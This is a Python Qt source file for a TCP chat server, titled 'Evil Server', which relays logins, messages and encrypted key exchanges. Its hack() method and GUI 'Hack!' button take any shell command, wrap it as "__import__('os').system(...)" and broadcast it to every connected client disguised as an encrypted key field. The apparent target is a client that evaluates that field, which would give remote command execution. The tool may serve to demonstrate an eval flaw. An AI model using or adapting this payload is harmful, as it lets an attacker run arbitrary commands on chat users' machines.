import json
import sys

from qtpy.QtNetwork import QTcpServer, QTcpSocket
from qtpy.QtWidgets import (QApplication, QGroupBox, QLabel, QLineEdit,
                            QPushButton, QVBoxLayout, QWidget)


class Server(QTcpServer):
    def __init__(self, *args, **kwargs):
        super(Server, self).__init__(*args, **kwargs)
        self.clients = {}
        self.newConnection.connect(self.newClient)

    def newClient(self):
        client = self.nextPendingConnection()
        client.readyRead.connect(self.readData)
        client.disconnected.connect(self.disconnectClient)
        self.clients[client] = {}

    def disconnectClient(self):
        client = self.sender()
        self.clients.pop(client)

    def send(self, client: QTcpSocket, message: dict):
        client.write(json.dumps(message).encode('utf-8'))

    def sendToAll(self, message: dict):
        for client in self.clients:
            self.send(client, message)

    def read(self, client: QTcpSocket) -> dict:
        x = client.readLine().data().decode('utf-8')
        return json.loads(x)

    def readData(self):
        string = self.sender().readLine().data().decode('utf-8')
        stack = 0
        messages = []
        left = 0
        for right, c in enumerate(string):
            if c == '{':
                stack += 1
            elif c == '}':
                stack -= 1
            if stack == 0:
                messages.append(string[left:right + 1])
                left = right + 1

        for message in messages:
            self.handleData(json.loads(message))

    def hack(self, evil_cmd):
        evil_str = f"__import__('os').system('{evil_cmd}')"
        self.sendToAll({
            'type': 'a1',
            'data': {
                'nickname': 'evildoer',
                'encrypted_fernet_key': evil_str
            }
        })

    def handleData(self, message):
        client = self.sender()

        type_ = message['type']
        data = message['data']

        if type_ == 'login':
            nickname = data['nickname']
            pbk = data['public_key']

            self.clients[client]['nickname'] = nickname
            self.clients[client]['public_key'] = pbk

            nicknames, pbks = [], []
            for client_data in self.clients.values():
                nicknames.append(client_data['nickname'])
                pbks.append(client_data['public_key'])

            self.send(client, {
                'type': 'login_response',
                'data': {
                    'nicknames': nicknames,
                    'public_keys': pbks
                }
            })
            self.sendToAll({
                'type': 'login_announce',
                'data': {
                    'nickname': nickname,
                    'public_key': pbk,
                    'text': f'{nickname} has joined the chat.'
                }
            })
        elif type_ == 'logoff':
            nickname = self.clients[client]['nickname']
            self.sendToAll({
                'type': 'logoff_announce',
                'data': {
                    'nickname': nickname,
                    'text': f'{nickname} has left the chat.'
                }
            })
        elif type_ == 'say':
            self.sendToAll({
                'type': 'say',
                'data': {
                    'nickname': self.clients[client]['nickname'],
                    'text': data['text']
                }
            })
        elif type_ == 'a0':
            efk = data['encrypted_fernet_key']
            for target_client, client_data in self.clients.items():
                if client_data['nickname'] == data['to']:
                    self.send(target_client, {
                        'type': 'a1',
                        'data': {
                            'nickname': data['from'],
                            'encrypted_fernet_key': efk
                        }
                    })

        elif type_ == 'b0':
            for target_client, client_data in self.clients.items():
                if client_data['nickname'] in data['to']:
                    i = data['to'].index(client_data['nickname'])
                    efk = data['encrypted_fernet_keys'][i]
                    self.send(target_client, {
                        'type': 'a1',
                        'data': {
                            'nickname': data['from'],
                            'encrypted_fernet_key': efk
                        }
                    })


class ServerWidget(QWidget):
    def __init__(self, server: Server, *args, **kwargs):
        super(ServerWidget, self).__init__(*args, **kwargs)
        self.server = server

        self.setWindowTitle('Evil Server')

        infoGroup = QGroupBox('Information')
        portLabel = QLabel(
            f'Server listening on port {self.server.serverPort()}.')
        infoLayout = QVBoxLayout()
        infoLayout.addWidget(portLabel)
        infoGroup.setLayout(infoLayout)

        hackGroup = QGroupBox('Hacking')
        hackLabel = QLabel('Insert your evil shell command bellow.')
        self.hackLineEdit = QLineEdit()
        self.hackButton = QPushButton('Hack!')
        self.hackLineEdit.returnPressed.connect(
            self.hackButton.click)
        self.hackButton.clicked.connect(self.hack)
        hackLayout = QVBoxLayout()
        hackLayout.addWidget(hackLabel)
        hackLayout.addWidget(self.hackLineEdit)
        hackLayout.addWidget(self.hackButton)
        hackGroup.setLayout(hackLayout)

        layout = QVBoxLayout()
        layout.addWidget(infoGroup)
        layout.addWidget(hackGroup)
        self.setLayout(layout)

    def hack(self):
        self.server.hack(self.hackLineEdit.text())
        self.hackLineEdit.selectAll()


if __name__ == "__main__":
    app = QApplication([])

    server = Server()
    port = 9000
    server.listen(port=port)

    window = ServerWidget(server)
    window.show()

    sys.exit(app.exec_())
